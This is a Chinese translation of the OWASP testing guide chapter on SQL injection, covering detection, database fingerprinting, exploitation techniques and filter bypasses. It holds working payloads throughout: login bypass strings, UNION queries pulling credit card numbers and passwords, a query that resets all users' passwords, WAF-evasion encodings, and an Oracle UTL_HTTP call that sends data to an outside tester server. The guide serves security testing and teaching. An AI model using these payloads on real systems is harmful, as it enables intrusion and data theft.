# 测试SQL注入

|ID          |
|------------|
|WSTG-INPV-05|

## 概述

SQL注入测试检查是否有可能向应用程序/站点注入数据，使其在数据库中执行用户控制的SQL查询。如果应用程序使用用户输入来创建SQL查询而没有适当的输入验证，测试人员会发现SQL注入漏洞。成功利用此类漏洞允许未授权用户访问或操作数据库中的数据，如果您已经知道，这是相当糟糕的。

[SQL注入](https://owasp.org/www-community/attacks/SQL_Injection)攻击包括通过数据输入或从客户端（浏览器）传输到Web应用程序的过程中插入或"注入"部分或全部SQL查询。成功的SQL注入攻击可以读取数据库中的敏感数据、修改数据库数据（插入/更新/删除）、对数据库执行管理操作（如关闭DBMS）、恢复DBMS文件系统上给定文件的内容或将文件写入文件系统，在某些情况下甚至可以向操作系统发出命令。SQL注入攻击是注入攻击的一种，在数据平面输入中注入SQL命令以影响预定义SQL命令的执行。

通常，Web应用程序构建涉及由程序员编写的SQL语法的SQL语句与用户提供的混合数据。例如：

`select title, text from news where id=$id`

在上面的示例中，变量`$id`包含用户提供的数据，而其余部分是程序员提供的SQL静态部分；使SQL语句成为动态的。

由于其构建方式，用户可以提供精心构造的输入，试图使原始SQL语句执行用户选择的其他操作。下面的示例说明了用户提供的"10 or 1=1"数据，该数据改变了SQL语句的逻辑，在WHERE子句中添加了条件"or 1=1"。

`select title, text from news where id=10 or 1=1`

> **_注意：_**  在SQL查询中注入条件OR 1=1时要小心。虽然在您注入的初始上下文中这可能是无害的，但应用程序通常在多个不同的查询中使用单个请求中的数据。例如，如果您的条件到达UPDATE或DELETE语句，可能导致意外的数据丢失。

SQL注入攻击可分为以下三类：

- 带内：使用与注入SQL代码相同的通道提取数据。这是最直接的攻击，检索到的数据直接显示在应用程序网页中。
- 带外：使用不同通道（例如，生成包含查询结果的电子邮件并发送给测试人员）检索数据。
- 推理或盲注：没有实际的数据传输。但是，测试人员可以通过发送特定请求并观察DB服务器 resulting behavior 来重建信息。

成功的SQL注入攻击需要攻击者精心构造语法正确的SQL查询。如果应用程序返回由错误查询生成的错误消息，攻击者可能更容易重建原始查询的逻辑，因此了解如何正确执行注入。但是，如果应用程序隐藏错误细节，则测试人员必须能够反推原始查询的逻辑。

关于利用SQL注入漏洞的技术，有五种常见技术。这些技术有时可以组合使用（例如，联合运算符和带外）：

- 联合运算符：当SQL注入漏洞发生在SELECT语句中时，可用于将两个查询组合成单个结果或结果集。
- 布尔：使用布尔条件验证某些条件是真还是假。
- 基于错误：此技术强制数据库生成错误，为攻击者或测试人员提供细化其注入的信息。
- 带外：使用不同通道（例如，发送HTTP连接将结果发送到Web服务器）检索数据的技术。
- 时间延迟：使用数据库命令（如sleep）在条件查询中延迟答案。当攻击者没有从应用程序获得某些答案（结果、输出或错误）时，这很有用。

## 测试目标

- 识别SQL注入点。
- 评估注入的严重程度以及可通过其实现的访问级别。

## 如何测试

### 检测技术

此测试的第一步是了解应用程序何时与DB服务器交互以访问某些数据。应用程序需要与数据库对话的典型情况包括：

- 身份验证表单：当使用Web表单执行身份验证时，用户凭据可能会根据包含所有用户名和密码（或更好的密码哈希）的数据库进行检查。
- 搜索引擎：用户提交的字符串可用于从数据库提取所有相关记录的SQL查询。
- 电子商务网站：产品及其特性（价格、描述、可用性等）很可能存储在数据库中。

测试人员必须列出其值可用于构造SQL查询的所有输入字段，包括POST请求的隐藏字段，然后分别测试它们，试图干扰查询并生成错误。同时考虑HTTP头和Cookie。

第一个测试通常包括在测试的字段或参数中添加单个引号`'`或分号`;`。第一个在SQL中用作字符串终止符，如果应用程序未过滤，将导致错误查询。第二个用于结束SQL语句，如果未过滤，也可能产生错误。易受攻击字段的输出可能类似于以下内容（在Microsoft SQL Server的情况下）：

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the
character string ''.
/target/target.asp, line 113
```

也可以使用注释分隔符（`--`或`/* */`等）和其他SQL关键字（如AND和OR）来尝试修改查询。一个非常简单但有时仍然有效的技术是在预期数字的地方插入字符串，因为可能生成如下错误：

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the
varchar value 'test' to a column of data type int.
/target/target.asp, line 113
```

监控Web服务器的所有响应并查看HTML/JavaScript源代码。有时错误存在于其中，但由于某些原因（例如JavaScript错误、HTML注释等）不会呈现给用户。完整的错误消息（如示例中的消息）为测试人员提供了大量信息来发起成功的注入攻击。但是，应用程序通常不提供那么多细节：可能发出简单的'500 Server Error'或自定义错误页面，这意味着我们需要使用盲注技术。无论如何，单独测试每个字段非常重要：只有一个变量必须改变，而所有其他变量保持不变，以便精确了解哪些参数是易受攻击的，哪些不是。

### 标准SQL注入测试方法

#### 经典SQL注入

考虑以下SQL查询：

`SELECT * FROM Users WHERE Username='$username' AND Password='$password'`

Web应用程序通常使用类似查询来验证用户身份。如果查询返回值，则意味着数据库中存在具有该凭据集的用户，然后允许用户登录系统，否则拒绝访问。从用户通过Web表单输入的输入字段获取的值。如果我们在Username和Password值中插入以下值：

`$username = 1' or '1' = '1`

`$password = 1' or '1' = '1'`

查询将是：

`SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'`

> **_注意：_**  在SQL查询中注入条件OR 1=1时要小心。虽然在您注入的初始上下文中这可能是无害的，但应用程序通常在多个不同的查询中使用单个请求中的数据。例如，如果您的条件到达UPDATE或DELETE语句，可能导致意外的数据丢失。

如果我们假设参数值是通过GET方法发送到服务器的，并且易受攻击站点的域是`www.example.com`，我们将执行的请求是：

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&password=1'%20or%20'1'%20=%20'1`

经过简短分析，我们注意到查询返回一个值（或一组值），因为条件始终为真（`OR 1=1`）。这样，系统无需知道用户名和密码即可对用户进行身份验证。

> 注意：在某些系统中，用户表的第一行将是管理员用户。在某些情况下，这可能是返回的个人资料。

另一个示例查询是：

`SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))`

在这种情况下，有两个问题：一个是由于括号的使用，另一个是由于MD5哈希函数的使用。首先，我们解决括号的问题。这仅仅需要添加一些右括号直到我们获得更正的查询。为了解决第二个问题，我们试图逃避第二个条件。我们在查询末尾添加一个表示注释开始的符号。以这种方式，之后该符号的所有内容都被视为注释。每个DBMS都有自己注释语法，但是大多数数据库的通用符号是`/*`。在Oracle中，符号是`--`。我们用作Username和Password的值是：

`$username = 1' or '1' = '1'))/*`

`$password = foo`

这样，我们将获得以下查询：

`SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))`

（由于在`$username`值中包含注释分隔符，查询的密码部分将被忽略。）

请求URL将是：

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&password=foo`

这可能返回一些值。有时，身份验证代码验证返回的记录/结果数量恰好为1。在前面的示例中，这种情况将很困难（因为数据库中每个用户只有一个值）。为了解决此问题，只需插入一个SQL命令，施加返回结果数量必须为一个的条件（返回一条记录）。为此，我们使用运算符`LIMIT <num>`，其中`<num>`是我们想要返回的结果/记录的数量。关于前面的示例，Username和Password字段的值将修改如下：

`$username = 1' or '1' = '1')) LIMIT 1/*`

`$password = foo`

这样，我们将创建一个如下请求：

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&password=foo`

#### SELECT语句

考虑以下SQL查询：

`SELECT * FROM products WHERE id_product=$id_product`

还考虑对执行上述查询的脚本的请求：

`https://www.example.com/product.php?id=10`

当测试人员尝试有效值时（例如本例中的10），应用程序将返回产品描述。测试应用程序是否在此场景中易受攻击的一种好方法是使用AND和OR运算符来玩逻辑游戏。

考虑请求：

`https://www.example.com/product.php?id=10 AND 1=2`

`SELECT * FROM products WHERE id_product=10 AND 1=2`

在这种情况下，应用程序可能返回一条消息告诉我们没有可用内容或空白页面。然后测试人员可以发送真语句并检查是否有有效结果：

`https://www.example.com/product.php?id=10 AND 1=1`

#### 堆叠查询

根据Web应用程序使用的API和DBMS（例如PHP + PostgreSQL，ASP+SQL SERVER），可能在一个调用中执行多个查询。

考虑以下SQL查询：

`SELECT * FROM products WHERE id_product=$id_product`

利用上述场景的一种方法是：

`https://www.example.com/product.php?id=10; INSERT INTO users (…)`

这种方式可以连续执行多个查询，独立于第一个查询。

### 数据库指纹识别

即使SQL语言是标准化的，每个DBMS都有其特性，在许多方面彼此不同，如特殊命令和用于检索数据的函数（如用户名和数据库）、功能、注释行等。

当测试人员进入更高级的SQL注入利用时，他们需要知道后端数据库是什么。

#### 应用程序返回的错误

找出使用哪种后端数据库的第一种方法是观察应用程序返回的错误。以下是一些错误消息示例：

MySql:

```html
You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the
right syntax to use near '\'' at line 1
```

一个完整的UNION SELECT与version()也可以帮助了解后端数据库。

`SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1`

Oracle:

`ORA-00933: SQL command not properly ended`

MS SQL Server:

```html
Microsoft SQL Native Client error '80040e14'
Unclosed quotation mark after the character string

SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1
```

PostgreSQL:

```html
Query failed: ERROR: syntax error at or near
"'" at character 56 in /www/site/test.php on line 121.
```

如果没有错误消息或自定义错误消息，测试人员可以尝试使用不同的连接技术将其注入字符串字段：

- MySql: 'test' + 'ing'
- SQL Server: 'test' 'ing'
- Oracle: 'test'||'ing'
- PostgreSQL: 'test'||'ing'

### 利用技术

#### 联合利用技术

UNION运算符用于SQL注入，将测试人员精心构造的查询连接到原始查询。构造查询的结果将连接到原始查询的结果，允许测试人员获取其他表列的值。假设我们的示例中从服务器执行的查询是：

`SELECT Name, Phone, Address FROM Users WHERE Id=$id`

我们将设置以下`$id`值：

`$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

我们将有以下查询：

`SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

这将把原始查询的结果与CreditCardTable表中的所有信用卡号连接起来。关键字`ALL`对于绕过使用关键字`DISTINCT`的查询是必要的。此外，我们注意到，除了信用卡号码外，我们还选择了其他两个值。这两个值是必要的，因为两个查询必须具有相同数量的参数/列以避免语法错误。

测试人员需要找到利用此技术利用SQL注入漏洞的第一个细节是SELECT语句中正确数量的列。

为此，测试人员可以使用`ORDER BY`子句，后跟一个数字，指示所选数据库列的编号：

`https://www.example.com/product.php?id=10 ORDER BY 10--`

如果查询成功执行，测试人员可以假设此示例中有10列或更多在`SELECT`语句中。如果查询失败，则返回的列数必须少于10。如果有可用的错误消息，它可能是：

`Unknown column '10' in 'order clause'`

在测试人员找到列数之后，下一步是找出列的类型。假设上述示例中有3列，测试人员可以尝试使用NULL值帮助每个列类型：

`https://www.example.com/product.php?id=10 UNION SELECT 1,null,null--`

如果查询失败，测试人员可能会看到如下消息：

`All cells in a column must have the same datatype`

如果查询成功执行，则第一列可以是整数。然后测试人员可以进一步移动，依此类推：

`https://www.example.com/product.php?id=10 UNION SELECT 1,1,null--`

成功收集信息后，根据应用程序的不同，它可能只向测试人员显示第一个结果，因为应用程序只处理结果集的第一行。在这种情况下，可以使用`LIMIT`子句，或者测试人员可以设置无效值，使第二个查询有效（假设数据库中没有ID等于99999的条目）：

`https://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--`

#### 隐藏联合利用技术

最好使用[联合技术](#union-exploitation-technique)利用SQL注入，因为您可以在一次请求中检索查询结果。
但野生的大多数SQL注入是盲的。但是，您可以将其中一些转换为基于联合的注入。

**识别**
以下方法可用于识别这些SQL注入：

1. 易受攻击的查询返回数据，但注入是盲的。
2. `ORDER BY`技术有效，但无法实现基于联合的注入。

**根本原因**
您不能使用常规联合技术的原因是高危查询的复杂性。在联合技术中，您在`UNION` payload之后注释掉查询的其余部分。对于正常查询，这很好，但在更复杂的查询中可能会有问题。如果查询的第一部分依赖于第二部分，注释掉它的其余部分会破坏原始查询。

**场景1**
易受攻击的查询是一个子查询，父查询处理返回数据。

```text
SELECT 
  * 
FROM 
  customers 
WHERE 
  id IN (                 --\
    SELECT                   |
      DISTINCT customer_id   |
    FROM                     |
      orders                 |--> vulnerable query
    WHERE                    |
      cost > 200             |
  );                      --/
```

- _问题：_ 如果注入`UNION` payload，它不会影响返回的数据。因为您正在修改`WHERE`部分。实际上，您没有将`UNION`查询附加到原始查询。
- _解决方案：_ 您需要知道在后端执行的查询。然后，根据需要创建有效载荷关闭开放括号或添加适当的关键字。

**场景2**
易受攻击的查询包含别名或变量声明。

```text
SELECT 
  s1.user_id, 
  (                                                                                      --\
    CASE WHEN s2.user_id IS NOT NULL AND s2.sub_type = 'INJECTION_HERE' THEN 1 ELSE 0 END   |--> vulnerable query
  ) AS overlap                                                                           --/
FROM 
  subscriptions AS s1 
  LEFT JOIN subscriptions AS s2 ON s1.user_id != s2.user_id 
  AND s1.start_date <= s2.end_date 
  AND s1.end_date >= s2.start_date 
GROUP BY 
  s1.user_id
```

- _问题：_ 当您注释掉注入有效载荷后原始查询的其余部分时，您会破坏查询，因为某些别名或变量变为`undefined`。
- _解决方案：_ 您需要在有效载荷开头放置适当的关键字或别名。这样，原始查询的第一部分保持有效。

**场景3**
易受攻击查询的结果在第二个查询中使用。第二个查询返回数据，而不是第一个。

```text
<?php
// retrieves product ID based on product name
                            --\
$query1 = "SELECT              |
             id                |
           FROM                |
             products          |--> vulnerable query #1
           WHERE               |
             name = '$name'";  |
                            --/
$result1 = odbc_exec($conn, $query1);
// retrieves product's comments based on the product ID
                              --\
$query2 = "SELECT                |
             comments            |
           FROM                  |
             products            |--> vulnerable query #2
           WHERE                 |
             id = '$result1'";   |
                              --/
$result1 = odbc_exec($conn, $query2);
?>
```

- _问题：_ 您可以将`UNION` payload添加到第一个查询，但它不会影响返回的数据。
- _解决方案：_ 您需要在第二个查询中注入。因此，第二个查询的输入不应该被清理。然后，您需要使第一个查询不返回数据。现在追加一个`UNION`查询，返回您要注入到_第二个查询_的payload。
   
  **示例：**
  有效载荷的基础（您注入第一个查询的内容）：

  ```text
  ' AND 1 = 2 UNION SELECT "PAYLOAD" -- -
  ```

  `PAYLOAD`是您要注入_第二个查询_的内容：
  
  ```text
  ' AND 1=2 UNION SELECT ...
  ```

  最终payload（替换`PAYLOAD`后）：

  ```text
  ' AND 1 = 2 UNION SELECT "' AND 1=2 UNION SELECT ..." -- -
                            \________________________/
                                        ||
                                        \/
                                 the payload that
                                  get's injected
                                into the second query
  \________________________________________________________/
                              ||
                              \/
   the actual query we inject into the vulnerable parameter
  ```

  注入后的第一个查询：

  ```text
  SELECT               --\
    id                    |
  FROM                    |----> first query
    products              |
  WHERE                   |
    name = 'abcd'      --/
    AND 1 = 2                                 --\
  UNION                                          |----> injected payload (what gets injected into the second payload)
  SELECT                                         |
    "' AND 1=2 UNION SELECT ... -- -" -- -'   --/
  ```

  注入后的第二个查询：

  ```text
  SELECT            --\
    comments           |
  FROM                 |----> second query
    products           |
  WHERE                |
    id = ''         --/
    AND 1 = 2         --\ 
  UNION                  |----> injected payload (the final UNION query that controls the returned data)
  SELECT ... -- -'    --/
  ```

**场景4**
易受攻击的参数在多个独立查询中使用。

```text
<?php
//retrieving product details based on product ID
$query1 = "SELECT 
             name, 
             inserted, 
             size 
           FROM 
             products 
           WHERE 
             id = '$id'";
$result1 = odbc_exec($conn, $query1);
//retrieving product comments based on the product ID
$query2 = "SELECT 
             comments 
           FROM 
             products 
           WHERE 
             id = '$id'";
$result2 = odbc_exec($conn, $query2);
?>
```

- _问题：_ 将`UNION`查询附加到第一个（或第二个）查询不会破坏它，但可能会破坏另一个查询。
- _解决方案：_ 这取决于应用程序的代码结构。但第一步是了解原始查询。大多数情况下，这些注入是基于时间的。此外，时间有效载荷被注入多个查询，这可能会有问题。
  例如，如果您使用`SQLMap`，这种情况会混淆工具，输出会混乱。因为延迟不会如预期那样。

**提取原始查询**
如您所见，了解原始查询对于实现基于联合的注入始终是必要的。
您可以使用默认的DBMS表检索原始查询：

| DBMS                 | 表                          |
|----------------------|--------------------------------|
| MySQL                | INFORMATION_SCHEMA.PROCESSLIST |
| PostgreSQL           | pg_stat_activity               |
| Microsoft SQL Server | sys.dm_exec_cached_plans       |
| Oracle               | V$SQL                          |

**自动化**
自动化工作流的步骤：

1. 使用SQLMap和盲注入提取原始查询。
2. 根据原始查询构建基础payload并实现基于联合的注入。
3. 通过以下选项之一自动利用基于联合的注入：
    - 指定_自定义注入点标记_（`*`）
    - 使用`--prefix`和`--suffix`标志。

**示例：**
考虑上面讨论的第三个场景。
我们假设DMBS是`MySQL`，第一个和第二个查询只返回一列。
这可能是提取数据库版本的payload：

```text
' AND 1=2 UNION SELECT " ' AND 1=2 UNION SELECT @@version -- -" -- -
```

所以目标URL将如下所示：

```text
https://example.org/search?query=abcd'+AND+1=2+UNION+SELECT+"+'AND 1=2+UNION+SELECT+@@version+--+-"+--+-
```

自动化：

- _自定义注入点标记_（`*`）：

  ```text
  sqlmap -u "https://example.org/search?query=abcd'AND 1=2 UNION SELECT \"*\"-- -"
  ```

- `--prefix`和`--suffix`标志：

  ```text
  sqlmap -u "https://example.org/search?query=abcd" --prefix="'AND 1=2 UNION SELECT \"" --suffix="\"-- -"
  ```

#### 布尔利用技术

当测试人员发现[盲SQL注入](https://owasp.org/www-community/attacks/Blind_SQL_Injection)情况时，布尔利用技术非常有用，在这种情况下，对操作结果一无所知。例如，当程序员创建了一个自定义错误页面，该页面不显示有关查询或数据库结构的任何信息时，会发生这种行为。（页面不返回SQL错误，它可能只返回HTTP 500、404或重定向）。

通过使用推理方法，可以避免此障碍，从而成功恢复某些期望字段的值。该方法包括对服务器执行一系列布尔查询，观察答案，最终推断这些答案的含义。我们总是考虑`www.example.com`域，并假设它包含一个名为`id`的参数，该参数容易受到SQL注入的影响。这意味着当执行以下请求时：

`https://www.example.com/index.php?id=1'`

我们将收到一个自定义错误消息，这是查询中语法错误导致的。我们假设在服务器上执行的查询是：

`SELECT field1, field2, field3 FROM Users WHERE Id='$Id'`

可以通过之前看到的方法利用。但是，我们想要获取username字段的值。我们将执行的测试将允许我们获取username字段的值，一次一个字符。这是通过使用一些标准函数实现的，实际上每个数据库都有这些函数。对于我们的示例，我们将使用以下伪函数：

- SUBSTRING (text, start, length): 从文本的"start"位置返回长度为"length"的子字符串。如果"start"大于文本的长度，函数返回空值。

- ASCII (char): 返回输入字符的ASCII值。如果char为0，则返回空值。

- LENGTH (text): 返回输入文本中的字符数。

通过这些函数，我们将对第一个字符执行测试，发现值后，将其传递给第二个字符，依此类推，直到发现整个值。测试将利用SUBSTRING函数一次只选择一个字符（选择单个字符意味着将length参数设置为1），以及ASCII函数，以便获得ASCII值，这样我们就可以进行数值比较。将与ASCII表的所有值进行比较，直到找到正确的值。作为示例，我们将使用以下值用于`Id`：

`$Id=1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1`

这会创建以下查询（我们将其称为"推理查询"）：

`SELECT field1, field2, field3 FROM Users WHERE Id='1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'`

前面的示例当且仅当username字段的第一个字符等于ASCII值97时返回结果。如果我们得到假值，那么我们将ASCII表的索引从97增加到98并重复请求。如果我们得到真值，我们将ASCII表索引设置为零并分析下一个字符，修改SUBSTRING函数的参数。问题是了解如何区分返回真值的测试和返回假值的测试。为此，我们创建一个始终返回假的查询。这可以通过以下值用于`Id`来实现：

`$Id=1' AND '1' = '2`

这将创建以下查询：

`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'`

从服务器（HTML代码）获得的响应将是我们测试的假值。这足以验证从推理查询执行获得的值与之前执行的测试获得的值是否相等。有时，此方法不起作用。如果服务器对两个相同的连续Web请求返回两个不同的页面，我们将无法区分真值和假值。在这些特殊情况下，有必要使用特殊过滤器，使我们能够消除两个请求之间变化的代码并获得模板。随后，对于执行的每个推理请求，我们将从响应中提取相对模板，使用相同的函数，并执行两个模板之间的控制以决定测试的结果。

在之前的讨论中，我们没有处理确定测试终止条件的问题，即何时结束推理过程。一种技术使用SUBSTRING函数和LENGTH函数的特性。当测试将当前字符与ASCII码0（即空值）进行比较并且测试返回真值时，那么要么我们完成了推理过程（已扫描整个字符串），要么我们分析的包含空字符。

我们将为字段`Id`插入以下值：

`$Id=1' OR LENGTH(username)=N AND '1' = '1`

其中N是我们迄今为止分析过的字符数（不计空值）。查询将是：

`SELECT field1, field2, field3 FROM Users WHERE Id='1' OR LENGTH(username)=N AND '1' = '1'`

查询返回真或假。如果我们获得真，那么我们就完成了推理，因此我们知道参数的值。如果我们获得假，则意味着参数值中存在空字符，我们必须继续分析下一个参数，直到找到另一个空值。

盲SQL注入攻击需要大量查询。测试人员可能需要自动工具来利用此漏洞。

#### 基于错误的利用技术

当测试人员由于某种原因无法使用其他技术（如UNION）利用SQL注入漏洞时，基于错误的利用技术非常有用。基于错误的技术包括强制数据库执行某些操作，结果将是错误。这里的要点是尝试从数据库中提取一些数据并将其显示在错误消息中。这种利用技术可能因DBMS而异（请参阅特定DBMS部分）。

考虑以下SQL查询：

`SELECT * FROM products WHERE id_product=$id_product`

还考虑对执行上述查询的脚本的请求：

`https://www.example.com/product.php?id=10`

恶意请求将是（例如Oracle 10g）：

`https://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--`

在此示例中，测试人员将值10与函数`UTL_INADDR.GET_HOST_NAME`的结果连接起来。此Oracle函数将尝试返回传递给它的参数的主机名，这是另一个查询，即用户名。當数据库查找具有用户数据库名的主机名时，它将失败并返回错误消息：

`ORA-292257: host SCOTT unknown`

然后，测试人员可以操作传递给GET_HOST_NAME()函数的参数，结果将显示在错误消息中。

#### 带外利用技术

当测试人员发现[盲SQL注入](https://owasp.org/www-community/attacks/Blind_SQL_Injection)情况时，此技术非常有用，在这种情况下，对操作结果一无所知。该技术包括使用DBMS函数执行带外连接并将注入查询的结果作为请求的一部分传递给测试人员的服务器。像基于错误的技术一样，每个DBMS都有自己的函数。请查看特定DBMS部分。

考虑以下SQL查询：

`SELECT * FROM products WHERE id_product=$id_product`

还考虑对执行上述查询的脚本的请求：

`https://www.example.com/product.php?id=10`

恶意请求将是：

`https://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80'||(SELECT user FROM DUAL)--`

在此示例中，测试人员将值10与函数`UTL_HTTP.request`的结果连接起来。此Oracle函数将尝试连接到`testerserver`并发出包含从查询`SELECT user FROM DUAL`返回的HTTP GET请求。测试人员可以设置Web服务器（例如Apache）或使用Netcat工具：

```bash
/home/tester/nc –nLp 80

GET /SCOTT HTTP/1.1
Host: testerserver.com
Connection: close
```

#### 时间延迟利用技术

当测试人员发现[盲SQL注入](https://owasp.org/www-community/attacks/Blind_SQL_Injection)情况时，时间延迟利用技术非常有用，在这种情况下，对操作结果一无所知。该技术包括发送注入查询，如果条件为真，测试人员可以观察服务器响应所花费的时间。如果有延迟，测试人员可以假设条件查询的结果为真。这种利用技术可能因DBMS而异（请参阅特定DBMS部分）。

考虑以下SQL查询：

`SELECT * FROM products WHERE id_product=$id_product`

还考虑对执行上述查询的脚本的请求：

`https://www.example.com/product.php?id=10`

恶意请求将是（例如MySql 5.x）：

`https://www.example.com/product.php?id=10 AND IF(version() like '5%', sleep(10), 'false'))--`

在此示例中，测试人员正在检查MySql版本是否为5.x，使服务器延迟10秒的响应。测试人员可以增加延迟时间并监控响应。测试人员也不需要等待响应。有时他可以设置一个非常高的值（例如100）并在几秒钟后取消请求。

#### 存储过程注入

在存储过程中使用动态SQL时，应用程序必须正确清理用户输入以消除代码注入的风险。如果未清理，用户可以输入恶意SQL，该SQL将在存储过程中执行。

考虑以下SQL Server存储过程：

```sql
Create procedure user_login @username varchar(20), @passwd varchar(20)
As
Declare @sqlstring varchar(250)
Set @sqlstring  = '
Select 1 from users
Where username = ' + @username + ' and passwd = ' + @passwd
exec(@sqlstring)
Go
```

用户输入：

```sql
anyusername or 1=1'
anypassword
```

此过程不清理输入，因此允许返回值显示具有这些参数的现有记录。

> 此示例由于使用动态SQL登录用户而看起来不太可能，但请考虑一个动态报告查询，用户可以在其中选择要查看的列。用户可以将恶意代码插入此场景并 compromise 数据。

考虑以下SQL Server存储过程：

```sql
Create
procedure get_report @columnamelist varchar(7900)
As
Declare @sqlstring varchar(8000)
Set @sqlstring  = '
Select ' + @columnamelist + ' from ReportTable'
exec(@sqlstring)
Go
```

用户输入：

```sql
1 from users; update users set password = 'password'; select *
```

这将导致报告运行，所有用户的密码都将被更新。

#### 自动利用

这里介绍的大多数情况和技尸都可以使用一些工具自动执行。在本文中，测试人员可以找到有关如何使用[SQLMap](https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap)执行自动审计的信息。

### SQL注入签名绕过技术

这些技术用于绕过诸如Web应用程序防火墙（WAF）或入侵防御系统（IPS）之类的防御。另请参阅[https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)

#### 空格

删除空格或添加不会影响SQL语句的空格。例如

```sql
or 'a'='a'

or 'a'  =    'a'
```

添加不会影响SQL语句执行的新行或制表符等特殊字符。例如，

```sql
or
'a'=
        'a'
```

#### 空字节

在任何过滤器阻止的字符前使用空字节（%00）。

例如，如果攻击者可以注入以下SQL

`' UNION SELECT password FROM Users WHERE username='admin'--`

添加空字节将是

`%00' UNION SELECT password FROM Users WHERE username='admin'--`

#### SQL注释

添加SQL内联注释也可以帮助SQL语句有效并绕过SQL注入过滤器。以此SQL注入为例。

`' UNION SELECT password FROM Users WHERE name='admin'--`

添加SQL内联注释将是：

`'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--`

`'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--`

#### URL编码

使用[在线URL编码](https://meyerweb.com/eric/tools/dencoder/)对SQL语句进行编码

`' UNION SELECT password FROM Users WHERE name='admin'--`

SQL注入语句的URL编码将是

`%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--`

#### 字符编码

Char()函数可用于替换英语字符。例如，char(114,111,111,116)表示root

`' UNION SELECT password FROM Users WHERE name='root'--`

应用Char()后，SQL注入语句将是

`' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--`

#### 字符串连接

连接会破坏SQL关键字并绕过过滤器。连接语法因数据库引擎而异。以MS SQL引擎为例

`select 1`

简单的SQL语句可以通过使用连接更改为以下内容

`EXEC('SEL' + 'ECT 1')`

#### 十六进制编码

十六进制编码技术使用十六进制编码替换原始SQL语句字符。例如，`root`可以表示为`726F6F74`

`Select user from users where name = 'root'`

使用十六进制值的SQL语句将是：

`Select user from users where name = 726F6F74`

或者

`Select user from users where name = unhex('726F6F74')`

#### 声明变量

将SQL注入语句声明为变量并执行。

例如，以下SQL注入语句

`Union Select password`

将SQL语句定义为变量`SQLivar`

```sql
; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');
EXEC(@SQLivar)
```

#### 'or 1 = 1'的替代表达式

```sql
OR 'SQLi' = 'SQL'+'i'
OR 'SQLi' > 'S'
or 20 > 1
OR 2 between 3 and 1
OR 'SQLi' = N'SQLi'
1 and 1 = 1
1 || 1 = 1
1 && 1 = 1
```

### SQL通配符注入

大多数SQL方言支持单字符通配符（通常为"`?`"或"`_`"）和多字符通配符（通常为"`%`"或"`*`"），可用于带有`LIKE`运算符的查询。即使使用适当的控件（如参数或预处理语句）保护免受SQL注入攻击，也可能将通配符注入查询。

例如，如果Web应用程序允许用户在结账过程中输入折扣代码，并且使用诸如`SELECT * FROM discount_codes WHERE code LIKE ':code'`之类的查询检查此代码是否存在于数据库中，那么输入`%`的值（将插入`:code`参数的位置）将匹配所有折扣代码。

此技术还可用于通过越来越具体的查询（如`a%`、`b%`、`ba%`等）确定确切的折扣代码。

## 修复

- 要保护应用程序免受SQL注入漏洞的侵害，请参阅[SQL注入防范速查表](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)。
- 要保护SQL服务器，请参阅[数据库安全速查表](https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html)。

有关通用输入验证安全性的信息，请参阅[输入验证速查表](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)。

## 工具

- [SQL注入模糊字符串（来自wfuzz工具）- Fuzzdb](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection)
- [Bernardo Damele A. G.：sqlmap，自动SQL注入工具](https://sqlmap.org/)
- [Muhaimin Dzulfakar：MySqloit，MySql注入接管工具](https://github.com/dtrip/mysqloit)
- [SQL注入 - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## 参考资料

- [2017年十大-A1-注入](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)
- [SQL注入](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL注入](https://www.w3schools.com/sql/sql_injection.asp)

已为以下DBMS创建了特定技术的测试指南页面：

- [Oracle](05.1-Testing_for_Oracle.md)
- [MySQL](05.2-Testing_for_MySQL.md)
- [SQL Server](05.3-Testing_for_SQL_Server.md)
- [PostgreSQL](05.4-Testing_PostgreSQL.md)
- [MS Access](05.5-Testing_for_MS_Access.md)
- [NoSQL](05.6-Testing_for_NoSQL_Injection.md)
- [ORM](05.7-Testing_for_ORM_Injection.md)
- [客户端](05.8-Testing_for_Client-side.md)

### 白皮书

